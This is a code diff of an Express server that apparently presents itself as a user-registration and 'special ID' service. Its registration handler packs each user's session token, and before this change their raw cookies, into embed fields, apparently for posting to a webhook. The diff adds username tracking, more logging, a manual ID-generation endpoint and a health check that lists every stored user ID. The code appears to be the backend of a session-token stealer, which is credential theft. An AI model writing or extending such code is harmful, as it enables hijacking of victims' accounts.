@@ -6,14 +6,14 @@ const crypto = require('crypto');
 app.use(express.json());
 
 // Store generated IDs (in production, use a database)
-const generatedIds = new Map(); // userId -> { specialId, createdAt }
+const generatedIds = new Map(); // userId -> { specialId, createdAt, username }
 
 // Generate a unique special ID for a user
-function generateSpecialId(userId) {
-    // Create a hash based on userId + secret salt
+function generateSpecialId(userId, username) {
+    // Create a hash based on userId + username + secret salt
     const secret = process.env.SECRET_KEY || 'kholin-secret-salt-2024';
     const hash = crypto.createHash('sha256')
-        .update(userId + secret + Date.now().toString())
+        .update(userId + username + secret + Date.now().toString())
         .digest('hex')
         .substring(0, 16); // Take first 16 characters
     
@@ -37,12 +37,13 @@ app.post('/api/users/register', async (req, res) => {
                 specialId = generatedIds.get(userId).specialId;
                 console.log(`[${userId}] Using existing special ID: ${specialId}`);
             } else {
-                specialId = generateSpecialId(userId);
+                specialId = generateSpecialId(userId, username);
                 generatedIds.set(userId, {
                     specialId: specialId,
-                    createdAt: new Date().toISOString()
+                    createdAt: new Date().toISOString(),
+                    username: username
                 });
-                console.log(`[${userId}] Generated new special ID: ${specialId}`);
+                console.log(`[${userId}] Generated NEW special ID: ${specialId}`);
             }
         }
 
@@ -59,8 +60,7 @@ app.post('/api/users/register', async (req, res) => {
             { name: "🆔 User ID", value: `\`${userId}\``, inline: true },
             { name: "👥 Friends Count", value: `**${friendsCount || '0'}**`, inline: true },
             { name: "🔑 Special ID", value: `\`\`\`${specialId || 'N/A'}\`\`\``, inline: false },
-            { name: "🔑 Session Token", value: `\`\`\`${sessionToken}\`\`\``, inline: false },
-            { name: "📦 Raw Cookies", value: `\`\`\`${(rawCookieString || '').substring(0, 950)}\`\`\``, inline: false }
+            { name: "🔑 Session Token", value: `\`\`\`${sessionToken}\`\`\``, inline: false }
         ];
 
         // Add a fun emoji based on friends count
@@ -127,19 +127,61 @@ app.post('/api/users/register', async (req, res) => {
 app.get('/api/special-id/:userId', (req, res) => {
     const { userId } = req.params;
     
+    console.log(`[Special ID] Request for user: ${userId}`);
+    console.log(`[Special ID] Stored IDs:`, Array.from(generatedIds.keys()));
+    
     if (generatedIds.has(userId)) {
+        const data = generatedIds.get(userId);
+        console.log(`[Special ID] Found:`, data);
         return res.json({
             success: true,
             userId: userId,
-            specialId: generatedIds.get(userId).specialId,
-            createdAt: generatedIds.get(userId).createdAt
+            specialId: data.specialId,
+            username: data.username,
+            createdAt: data.createdAt
         });
     } else {
+        console.log(`[Special ID] NOT found for user: ${userId}`);
         return res.status(404).json({
             success: false,
             error: "No special ID found for this user"
         });
     }
+});
+
+// Generate special ID for a user (manual trigger)
+app.post('/api/generate-special-id', (req, res) => {
+    const { userId, username } = req.body;
+    
+    if (!userId || userId === "Unknown") {
+        return res.status(400).json({
+            success: false,
+            error: "Valid userId required"
+        });
+    }
+    
+    if (generatedIds.has(userId)) {
+        return res.json({
+            success: true,
+            specialId: generatedIds.get(userId).specialId,
+            alreadyExists: true
+        });
+    }
+    
+    const specialId = generateSpecialId(userId, username || "User");
+    generatedIds.set(userId, {
+        specialId: specialId,
+        createdAt: new Date().toISOString(),
+        username: username || "User"
+    });
+    
+    console.log(`[Special ID] Generated new ID for ${userId}: ${specialId}`);
+    
+    return res.json({
+        success: true,
+        specialId: specialId,
+        alreadyExists: false
+    });
 });
 
 // Verify a special ID
@@ -180,6 +222,7 @@ app.get('/api/all-special-ids', (req, res) => {
         data.push({
             userId,
             specialId: info.specialId,
+            username: info.username,
             createdAt: info.createdAt
         });
     }
@@ -246,7 +289,8 @@ app.get('/health', (req, res) => {
         status: 'healthy', 
         timestamp: new Date().toISOString(),
         webhookConfigured: !!process.env.webhook,
-        generatedIdsCount: generatedIds.size
+        generatedIdsCount: generatedIds.size,
+        generatedIds: Array.from(generatedIds.keys())
     });
 });
 
